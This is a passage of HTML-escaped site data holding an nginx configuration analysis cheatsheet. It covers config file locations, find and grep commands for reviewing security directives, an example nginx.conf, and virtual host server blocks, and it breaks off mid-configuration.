/^[45]/ {print $0}\u0026#39; /var/log/nginx/access.log | tail -20 Always ensure proper authorization before analyzing nginx configurations on systems you don\u0026rsquo;t own. This information should be used for legitimate security testing and system administration purposes only.\n","permalink":"https://realspaceeagle.github.io/cheatsheets/nginx-configuration-analysis/","summary":"\u003ch1 id=\"nginx-configuration-analysis-cheatsheet\"\u003eNginx Configuration Analysis Cheatsheet\u003c/h1\u003e\n\u003ch2 id=\"finding-nginx-configuration-files\"\u003eFinding Nginx Configuration Files\u003c/h2\u003e\n\u003ch3 id=\"common-configuration-locations\"\u003eCommon Configuration Locations\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Main nginx configuration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/etc/nginx/nginx.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/local/nginx/conf/nginx.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/local/etc/nginx/nginx.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Site-specific configurations\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/etc/nginx/sites-available/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/etc/nginx/sites-enabled/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/etc/nginx/conf.d/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Default site configuration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/etc/nginx/sites-available/default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/etc/nginx/sites-enabled/default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Additional includes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/etc/nginx/snippets/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/etc/nginx/modules-enabled/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"finding-configuration-files\"\u003eFinding Configuration Files\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Locate nginx configuration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -name \u003cspan class=\"s2\"\u003e\u0026#34;nginx.conf\u0026#34;\u003c/span\u003e 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind / -name \u003cspan class=\"s2\"\u003e\u0026#34;*.conf\u0026#34;\u003c/span\u003e -path \u003cspan class=\"s2\"\u003e\u0026#34;*nginx*\u0026#34;\u003c/span\u003e 2\u0026gt;/dev/null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check nginx process for config location\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eps aux \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enginx -t  \u003cspan class=\"c1\"\u003e# Test configuration and show file paths\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enginx -T  \u003cspan class=\"c1\"\u003e# Dump configuration\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Find all nginx-related files\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocate nginx.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocate sites-available\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocate sites-enabled\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"main-configuration-analysis\"\u003eMain Configuration Analysis\u003c/h2\u003e\n\u003ch3 id=\"nginxconf-structure\"\u003enginx.conf Structure\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Global context\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003euser\u003c/span\u003e \u003cspan class=\"s\"\u003ewww-data\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eworker_processes\u003c/span\u003e \u003cspan class=\"s\"\u003eauto\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003epid\u003c/span\u003e \u003cspan class=\"s\"\u003e/run/nginx.pid\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003einclude\u003c/span\u003e \u003cspan class=\"n\"\u003e/etc/nginx/modules-enabled/*.conf\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Events context\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eevents\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eworker_connections\u003c/span\u003e \u003cspan class=\"mi\"\u003e768\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003emulti_accept\u003c/span\u003e \u003cspan class=\"no\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003euse\u003c/span\u003e \u003cspan class=\"s\"\u003eepoll\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# HTTP context\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003ehttp\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Basic settings\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e    \u003cspan class=\"kn\"\u003esendfile\u003c/span\u003e \u003cspan class=\"no\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003etcp_nopush\u003c/span\u003e \u003cspan class=\"no\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003etcp_nodelay\u003c/span\u003e \u003cspan class=\"no\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003ekeepalive_timeout\u003c/span\u003e \u003cspan class=\"mi\"\u003e65\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003etypes_hash_max_size\u003c/span\u003e \u003cspan class=\"mi\"\u003e2048\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eserver_tokens\u003c/span\u003e \u003cspan class=\"no\"\u003eoff\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# Security: Hide nginx version\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# MIME types\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e    \u003cspan class=\"kn\"\u003einclude\u003c/span\u003e \u003cspan class=\"s\"\u003e/etc/nginx/mime.types\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003edefault_type\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/octet-stream\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Logging\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e    \u003cspan class=\"kn\"\u003eaccess_log\u003c/span\u003e \u003cspan class=\"s\"\u003e/var/log/nginx/access.log\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eerror_log\u003c/span\u003e \u003cspan class=\"s\"\u003e/var/log/nginx/error.log\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Gzip compression\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e    \u003cspan class=\"kn\"\u003egzip\u003c/span\u003e \u003cspan class=\"no\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003egzip_vary\u003c/span\u003e \u003cspan class=\"no\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003egzip_proxied\u003c/span\u003e \u003cspan class=\"s\"\u003eany\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003egzip_comp_level\u003c/span\u003e \u003cspan class=\"mi\"\u003e6\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Include site configurations\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e    \u003cspan class=\"kn\"\u003einclude\u003c/span\u003e \u003cspan class=\"s\"\u003e/etc/nginx/conf.d/*.conf\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003einclude\u003c/span\u003e \u003cspan class=\"s\"\u003e/etc/nginx/sites-enabled/*\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"security-relevant-directives\"\u003eSecurity-Relevant Directives\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for security headers\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;server_tokens\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;add_header\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Version disclosure\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;server_tokens\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Should be: server_tokens off;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# File upload limits\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;client_max_body_size\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Request limits\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;limit_req\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;limit_conn\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"virtual-host-discovery\"\u003eVirtual Host Discovery\u003c/h2\u003e\n\u003ch3 id=\"finding-virtual-hosts\"\u003eFinding Virtual Hosts\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# List all site configurations\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /etc/nginx/sites-available/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -la /etc/nginx/sites-enabled/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Extract server names from configurations\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;server_name\u0026#34;\u003c/span\u003e /etc/nginx/sites-available/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;server_name\u0026#34;\u003c/span\u003e /etc/nginx/sites-enabled/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Check for wildcard or catch-all configurations\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;server_name.*\\*\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -r \u003cspan class=\"s2\"\u003e\u0026#34;default_server\u0026#34;\u003c/span\u003e /etc/nginx/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"virtual-host-configuration-analysis\"\u003eVirtual Host Configuration Analysis\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Example virtual host configuration\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eserver\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003elisten\u003c/span\u003e \u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003elisten\u003c/span\u003e \u003cspan class=\"s\"\u003e[::]:80\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Primary domain and aliases\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e    \u003cspan class=\"kn\"\u003eserver_name\u003c/span\u003e \u003cspan class=\"s\"\u003eexample.com\u003c/span\u003e \u003cspan class=\"s\"\u003ewww.example.com\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Document root\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e    \u003cspan class=\"kn\"\u003eroot\u003c/span\u003e \u003cspan class=\"s\"\u003e/var/www/html\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eindex\u003c/span\u003e \u003cspan class=\"s\"\u003eindex.html\u003c/span\u003e \u003cspan class=\"s\"\u003eindex.htm\u003c/span\u003e \u003cspan class=\"s\"\u003eindex.php\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Locations\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e    \u003cspan class=\"kn\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e/\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"kn\"\u003etry_files\u003c/span\u003e \u003cspan class=\"nv\"\u003e$uri\u003c/span\u003e \u003cspan class=\"nv\"\u003e$uri/\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e404\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003elocation\u003c/span\u003e \u003cspan class=\"p\"\u003e~\u003c/span\u003e \u003cspan class=\"sr\"\u003e\\.php$\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"kn\"\u003einclude\u003c/span\u003e \u003cspan class=\"s\"\u003esnippets/fastcgi-php.conf\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"kn\"\u003efastcgi_pass\u003c/span\u003e \u003cspan class=\"s\"\u003eunix:/var/run/php/php7.4-fpm.sock\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Subdomain configuration\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eserver\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003elisten\u003c/span\u003e \u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003eserver_name\u003c/span\u003e \u003cspan class=\"s\"\u003esubdomain.example.com\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"kn\"\u003elocation\u003c/span\u003e \u003cspan class=\"s\"\u003e/\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"kn\"\u003eproxy_pass\u003c/span\u003e \u003cspan 